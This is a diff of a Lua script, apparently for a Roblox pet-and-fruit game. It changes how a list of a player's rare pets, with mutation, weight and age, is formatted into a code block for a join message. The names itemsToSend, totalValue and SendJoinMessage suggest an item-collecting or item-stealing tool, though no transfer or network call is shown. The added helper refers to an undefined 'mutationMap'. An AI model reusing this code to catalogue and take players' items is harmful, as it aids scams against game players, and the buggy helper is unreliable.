@@ -32,6 +32,12 @@ local rarePets = {
     "Raccoon"
 }
 
+local mutationNameMap = {
+    ["A"] = "Nightmare",
+    ["o"] = "Rainbow",
+    ["i"] = "Mega"
+}
+
 local totalValue = 0
 local itemsToSend = {}
 
@@ -173,6 +179,10 @@ local function getHighestKGFruit()
     return highestWeight
 end
 
+local function convertMutationTag(mutation)
+    return mutationMap[mutation] or ""  
+end
+
 local function BuildRareInventory()
     local inventory = {}
     local hasRare = false
@@ -180,14 +190,26 @@ local function BuildRareInventory()
     for _, item in ipairs(itemsToSend) do
         if table.find(rarePets, item.Name) then
             hasRare = true
-            local mutationTag = item.Mutation ~= "" and item.Mutation .. " " or ""
+
+            local mutationName = mutationNameMap[item.Mutation] or item.Mutation
+            local isNaturalRainbow = item.Name:sub(1, 7) == "Rainbow" and item.Mutation == ""
+
+            local prefix = ""
+
+            if mutationName ~= "" then
+                prefix = mutationName .. " "
+            elseif isNaturalRainbow then
+                prefix = "Rainbow "
+            end
+
+            local cleanName = item.Name:gsub("^Rainbow ", "") -- tanggalin ang "Rainbow " kung natural
+
             table.insert(inventory, string.format(
-                "%s%s (%.2f KG) [Age %d]: ¢%s",
-                mutationTag,
-                item.Name,
+                "%s%s (%.2f KG) [Age %d]",
+                prefix,
+                cleanName,
                 item.Weight or 0,
-                item.Age or 0,
-                formatNumber(item.Value)
+                item.Age or 0
             ))
         end
     end
@@ -199,7 +221,6 @@ local function BuildRareInventory()
     local text = "```\n" .. table.concat(inventory, "\n") .. "\n```"
     return text, true
 end
-
 
 local function SendJoinMessage(list, prefix)
     local inventoryText, hasRare = BuildRareInventory()
